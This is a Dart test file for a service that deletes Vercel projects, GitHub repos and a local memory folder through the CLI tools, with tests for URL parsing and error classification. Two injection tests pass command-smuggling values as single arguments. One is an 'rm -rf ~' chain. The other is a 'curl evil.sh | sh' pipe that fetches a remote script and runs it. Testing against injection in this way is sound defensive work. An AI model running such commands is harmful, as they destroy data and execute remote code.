import 'dart:io';

import 'package:test/test.dart';

import 'package:pro_orc/data/models/deletion_result.dart';
import 'package:pro_orc/data/services/external_deletion_service.dart';

/// A [ProcessRunner] that returns a fixed, injected result — no real
/// process is spawned, so `deleteGh` tests are deterministic and never
/// depend on the machine's actual `gh` login state.
ProcessRunner fakeRunner({required int exitCode, String stderr = ''}) {
  return (
    String executable,
    List<String> arguments, {
    bool runInShell = true,
  }) async {
    return ProcessResult(0, exitCode, '', stderr);
  };
}

void main() {
  group('buildVercelDeleteArgs', () {
    test('builds the exact expected argument list (no --yes: FR-014 '
        'deviation, see doc comment — the installed vercel CLI 51.8.0 does '
        'not accept that flag)', () {
      final args = buildVercelDeleteArgs('my-project');

      expect(args, ['project', 'remove', 'my-project']);
    });

    test('a project name containing shell metacharacters is passed as a '
        'single discrete argument and cannot break out or chain a command', () {
      const malicious = 'my-project; rm -rf ~ && echo "\$(whoami)" `id`';

      final args = buildVercelDeleteArgs(malicious);

      // The dangerous value must appear as exactly ONE list element,
      // never split, concatenated, or exposed as a raw shell string. As
      // long as it stays a single element passed via Process.run's args
      // list (not runInShell string interpolation), the shell never
      // parses its metacharacters.
      expect(args, ['project', 'remove', malicious]);
      expect(args.length, 3);
      expect(args, isNot(contains(';')));
      expect(args, isNot(contains('rm')));
    });
  });

  group('buildGhDeleteArgs', () {
    test('builds the exact expected argument list', () {
      final args = buildGhDeleteArgs('owner/repo');

      expect(args, ['repo', 'delete', 'owner/repo', '--yes']);
    });

    test('an owner/repo value containing shell metacharacters is passed as a '
        'single discrete argument and cannot break out or chain a command', () {
      const malicious = 'owner/repo\$(curl evil.sh | sh)`touch /tmp/pwn`';

      final args = buildGhDeleteArgs(malicious);

      expect(args, ['repo', 'delete', malicious, '--yes']);
      expect(args.length, 4);
    });
  });

  group('deriveVercelProjectName', () {
    test('derives the last path segment from a dashboard URL', () {
      final name = deriveVercelProjectName(
        'https://vercel.com/my-scope/my-project',
      );

      expect(name, 'my-project');
    });

    test('derives the last path segment from a nested dashboard URL', () {
      final name = deriveVercelProjectName(
        'https://vercel.com/my-scope/my-project/deployments',
      );

      expect(name, 'deployments');
    });

    test('returns null for a *.vercel.app deployment URL', () {
      final name = deriveVercelProjectName(
        'https://my-app-abc123xyz.vercel.app',
      );

      expect(name, isNull);
    });

    test('returns null for the bare vercel.app host', () {
      final name = deriveVercelProjectName('https://vercel.app');

      expect(name, isNull);
    });

    test('returns null for a non-vercel URL', () {
      final name = deriveVercelProjectName('https://example.com/foo/bar');

      expect(name, isNull);
    });

    test('returns null for an unparsable URL', () {
      final name = deriveVercelProjectName('not a url at all ::::');

      expect(name, isNull);
    });

    test('returns null when the dashboard URL has no path segments', () {
      final name = deriveVercelProjectName('https://vercel.com');

      expect(name, isNull);
    });

    test('returns null for the vercel.com/new boilerplate link — a '
        'create-next-app README ships this by default and it is not a real '
        'project (2026-07-20-delete-dialog-resource-over-detection)', () {
      final name = deriveVercelProjectName(
        'https://vercel.com/new?utm_medium=default-template&filter=next.js'
        '&utm_source=create-next-app&utm_campaign=create-next-app-readme',
      );

      expect(name, isNull);
    });

    test('returns null for vercel.com/new with no query string either', () {
      final name = deriveVercelProjectName('https://vercel.com/new');

      expect(name, isNull);
    });

    test('returns null when the URL carries query parameters — a real '
        'dashboard project URL never has a query string', () {
      final name = deriveVercelProjectName(
        'https://vercel.com/my-scope/my-project?tab=deployments',
      );

      expect(name, isNull);
    });

    test('returns null for a single-segment path — a real dashboard project '
        'URL always has scope AND project (at least two segments)', () {
      final name = deriveVercelProjectName('https://vercel.com/my-scope');

      expect(name, isNull);
    });

    test('returns null for the vercel.com/blog marketing URL — a blog post '
        'link (e.g. from a research notes .md file) is not a real dashboard '
        'project (2026-07-23-vercel-blog-url-classified-as-project-2)', () {
      final name = deriveVercelProjectName(
        'https://vercel.com/blog/common-mistakes-with-the-next-js-app-'
        'router-and-how-to-fix-them',
      );

      expect(name, isNull);
    });

    test('returns null for sibling Vercel marketing/docs routes', () {
      expect(
        deriveVercelProjectName('https://vercel.com/docs/frameworks/nextjs'),
        isNull,
      );
      expect(
        deriveVercelProjectName('https://vercel.com/templates/next.js/blog'),
        isNull,
      );
      expect(
        deriveVercelProjectName('https://vercel.com/pricing/enterprise'),
        isNull,
      );
    });

    test('still derives the project name for a real dashboard URL — the '
        'blocklist expansion must not regress the positive case', () {
      final name = deriveVercelProjectName(
        'https://vercel.com/roberts-projects-fb13711c/naida',
      );

      expect(name, 'naida');
    });
  });

  group('isVercelDashboardProjectUrl', () {
    test('rejects the vercel.com/blog marketing URL', () {
      expect(
        isVercelDashboardProjectUrl(
          'https://vercel.com/blog/common-mistakes-with-the-next-js-app-'
          'router-and-how-to-fix-them',
        ),
        isFalse,
      );
    });

    test('rejects sibling marketing/docs routes', () {
      expect(
        isVercelDashboardProjectUrl(
          'https://vercel.com/docs/frameworks/nextjs',
        ),
        isFalse,
      );
      expect(
        isVercelDashboardProjectUrl(
          'https://vercel.com/templates/next.js/blog',
        ),
        isFalse,
      );
    });

    test('still accepts a real dashboard project URL', () {
      expect(
        isVercelDashboardProjectUrl(
          'https://vercel.com/roberts-projects-fb13711c/naida',
        ),
        isTrue,
      );
    });
  });

  group('deriveGhOwnerRepo', () {
    test('derives owner/repo from a GitHub URL', () {
      final ownerRepo = deriveGhOwnerRepo(
        'https://github.com/n3urala1-rob/a1-pro-orc',
      );

      expect(ownerRepo, 'n3urala1-rob/a1-pro-orc');
    });

    test('ignores extra path segments beyond owner/repo', () {
      final ownerRepo = deriveGhOwnerRepo(
        'https://github.com/n3urala1-rob/a1-pro-orc/issues/5',
      );

      expect(ownerRepo, 'n3urala1-rob/a1-pro-orc');
    });

    test('returns null when only owner is present (no repo segment)', () {
      final ownerRepo = deriveGhOwnerRepo('https://github.com/n3urala1-rob');

      expect(ownerRepo, isNull);
    });

    test('returns null for a non-github URL', () {
      final ownerRepo = deriveGhOwnerRepo('https://example.com/a/b');

      expect(ownerRepo, isNull);
    });

    test('returns null for an unparsable URL', () {
      final ownerRepo = deriveGhOwnerRepo('not a url at all ::::');

      expect(ownerRepo, isNull);
    });
  });

  group('deleteGh', () {
    test('exit 0 returns DeletionResult.success', () async {
      final result = await deleteGh(
        'https://github.com/owner/repo',
        'owner/repo',
        runner: fakeRunner(exitCode: 0),
      );

      expect(result.succeeded, isTrue);
      expect(result.outcome, DeletionOutcome.success);
    });

    // NOTE (Wave 4, 008-deletion-scope-preflight-check, FR-009): this test
    // is the execution-time fallback-safety-net guard for the new pre-flight
    // check feature. Spec FR-009 requires that the existing missingScope
    // detection here in external_deletion_service.dart keeps working
    // unmodified, because the checkbox-time pre-flight check (introduced in
    // Waves 1-3 of this feature) narrows but does not eliminate every path
    // that can reach an actual `gh repo delete` call. This test was
    // originally written for Feature 007 (Complete Project Deletion) — it is
    // intentionally reused, not duplicated, since it already asserts exactly
    // the behavior FR-009 requires to remain intact.
    test('a missing delete_repo scope maps to missingScope with the refresh '
        'hint, DISTINCT from notAuthenticated (FR-009)', () async {
      final result = await deleteGh(
        'https://github.com/owner/repo',
        'owner/repo',
        runner: fakeRunner(
          exitCode: 1,
          stderr:
              'HTTP 404: Not Found\n'
              'This API operation needs the "delete_repo" scope. To '
              'request it, run: gh auth refresh -h github.com -s delete_repo',
        ),
      );

      expect(result.succeeded, isFalse);
      expect(result.outcome, DeletionOutcome.missingScope);
      expect(result.reason, contains('gh auth refresh -s delete_repo'));
    });

    test('a scope error is classified as missingScope even though the same '
        'stderr also contains a 404/not-found message — the scope check '
        'takes priority so a permission problem is never misreported as '
        'already-deleted success (matches the real installed gh CLI '
        'behavior for an unscoped token)', () async {
      final result = await deleteGh(
        'https://github.com/owner/repo',
        'owner/repo',
        runner: fakeRunner(
          exitCode: 1,
          stderr:
              'HTTP 404: Not Found (https://api.github.com/repos/owner/repo)\n'
              'This API operation needs the "delete_repo" scope. To '
              'request it, run: gh auth refresh -h github.com -s delete_repo',
        ),
      );

      expect(result.outcome, DeletionOutcome.missingScope);
      expect(result.outcome, isNot(DeletionOutcome.alreadyDeleted));
    });

    test('a genuine not-found error (no scope message) maps to alreadyDeleted '
        'success, labelled "war bereits geloescht" (FR-017)', () async {
      final result = await deleteGh(
        'https://github.com/owner/repo',
        'owner/repo',
        runner: fakeRunner(
          exitCode: 1,
          stderr:
              'GraphQL: Could not resolve to a Repository (repository) (Not Found)',
        ),
      );

      expect(result.succeeded, isTrue);
      expect(result.outcome, DeletionOutcome.alreadyDeleted);
      expect(result.reason, 'war bereits geloescht');
    });

    test('a plain auth failure maps to notAuthenticated, with reason text '
        'DISTINCT from the missingScope reason (FR-009)', () async {
      final result = await deleteGh(
        'https://github.com/owner/repo',
        'owner/repo',
        runner: fakeRunner(
          exitCode: 1,
          stderr: 'You are not logged into any GitHub hosts.',
        ),
      );

      expect(result.succeeded, isFalse);
      expect(result.outcome, DeletionOutcome.notAuthenticated);
      expect(result.reason, isNot(contains('delete_repo')));
    });

    test(
      'an unrecognized failure maps to genericFailure with a stderr gist',
      () async {
        final result = await deleteGh(
          'https://github.com/owner/repo',
          'owner/repo',
          runner: fakeRunner(
            exitCode: 1,
            stderr: 'some unexpected server error',
          ),
        );

        expect(result.succeeded, isFalse);
        expect(result.outcome, DeletionOutcome.genericFailure);
        expect(result.reason, contains('some unexpected server error'));
      },
    );

    test(
      'a runner that throws is caught and mapped to genericFailure',
      () async {
        Future<ProcessResult> throwingRunner(
          String executable,
          List<String> arguments, {
          bool runInShell = true,
        }) async {
          throw Exception('process spawn failed');
        }

        final result = await deleteGh(
          'https://github.com/owner/repo',
          'owner/repo',
          runner: throwingRunner,
        );

        expect(result.succeeded, isFalse);
        expect(result.outcome, DeletionOutcome.genericFailure);
      },
    );
  });

  group('deleteClaudeMemory', () {
    late Directory tmp;

    setUp(() async {
      tmp = await Directory.systemTemp.createTemp('delete_claude_memory_test_');
    });

    tearDown(() async {
      if (await tmp.exists()) await tmp.delete(recursive: true);
    });

    test(
      'deletes an existing directory from disk and returns success',
      () async {
        final memDir = Directory('${tmp.path}/claude_project');
        await memDir.create();
        await File('${memDir.path}/MEMORY.md').writeAsString('# notes');

        final result = await deleteClaudeMemory(memDir.path, memDir.path);

        expect(result.succeeded, isTrue);
        expect(result.outcome, DeletionOutcome.success);
        expect(await memDir.exists(), isFalse);
      },
    );

    test('a directory that does not exist maps to alreadyDeleted success '
        '(FR-017 idempotency), not a failure', () async {
      final missingDir = '${tmp.path}/never_existed';

      final result = await deleteClaudeMemory(missingDir, missingDir);

      expect(result.succeeded, isTrue);
      expect(result.outcome, DeletionOutcome.alreadyDeleted);
      expect(result.reason, 'war bereits geloescht');
    });
  });

  group('deleteVercel', () {
    VercelProcessRunner fixedVercelRunner({
      required int exitCode,
      String stderr = '',
      bool timedOut = false,
    }) {
      return (List<String> arguments) async {
        return VercelProcessOutcome(
          exitCode: exitCode,
          stderr: stderr,
          timedOut: timedOut,
        );
      };
    }

    test('exit 0 returns DeletionResult.success', () async {
      final result = await deleteVercel(
        'https://vercel.com/scope/my-project',
        'my-project',
        runner: fixedVercelRunner(exitCode: 0),
      );

      expect(result.succeeded, isTrue);
      expect(result.outcome, DeletionOutcome.success);
    });

    test(
      'a not-authenticated/invalid-token error maps to notAuthenticated '
      'even when the stderr ALSO happens to mention the project not '
      'existing — the auth check takes priority so an auth failure is '
      'never misreported as already-deleted success (mirrors deleteGh\'s '
      'scope-before-not-found ordering discipline for the same reason)',
      () async {
        final result = await deleteVercel(
          'https://vercel.com/scope/my-project',
          'my-project',
          runner: fixedVercelRunner(
            exitCode: 1,
            stderr:
                'Error: The token provided via `--token` argument is not '
                'valid. Please provide a valid token. No such project exists.',
          ),
        );

        expect(result.succeeded, isFalse);
        expect(result.outcome, DeletionOutcome.notAuthenticated);
        expect(result.outcome, isNot(DeletionOutcome.alreadyDeleted));
      },
    );

    test('a genuine not-found error (no auth failure) maps to alreadyDeleted '
        'success, labelled "war bereits geloescht" (FR-017) — verified '
        'against the real installed vercel CLI\'s exact stderr text', () async {
      final result = await deleteVercel(
        'https://vercel.com/scope/my-project',
        'my-project',
        runner: fixedVercelRunner(
          exitCode: 1,
          stderr: 'Error: No such project exists',
        ),
      );

      expect(result.succeeded, isTrue);
      expect(result.outcome, DeletionOutcome.alreadyDeleted);
      expect(result.reason, 'war bereits geloescht');
    });

    test(
      'an unrecognized failure maps to genericFailure with a stderr gist',
      () async {
        final result = await deleteVercel(
          'https://vercel.com/scope/my-project',
          'my-project',
          runner: fixedVercelRunner(
            exitCode: 1,
            stderr: 'Error: some unexpected Vercel API error',
          ),
        );

        expect(result.succeeded, isFalse);
        expect(result.outcome, DeletionOutcome.genericFailure);
        expect(result.reason, contains('some unexpected Vercel API error'));
      },
    );

    test('a timed-out process (the "y\\n" answer did not work, e.g. a future '
        'CLI version prompts differently) maps to genericFailure with a '
        'readable German reason, never hangs the caller', () async {
      final result = await deleteVercel(
        'https://vercel.com/scope/my-project',
        'my-project',
        runner: fixedVercelRunner(exitCode: -1, timedOut: true),
      );

      expect(result.succeeded, isFalse);
      expect(result.outcome, DeletionOutcome.genericFailure);
      expect(
        result.reason,
        contains('Vercel-CLI hat nicht wie erwartet reagiert'),
      );
    });

    test(
      'a runner that throws is caught and mapped to genericFailure',
      () async {
        Future<VercelProcessOutcome> throwingRunner(
          List<String> arguments,
        ) async {
          throw Exception('process spawn failed');
        }

        final result = await deleteVercel(
          'https://vercel.com/scope/my-project',
          'my-project',
          runner: throwingRunner,
        );

        expect(result.succeeded, isFalse);
        expect(result.outcome, DeletionOutcome.genericFailure);
      },
    );
  });
}
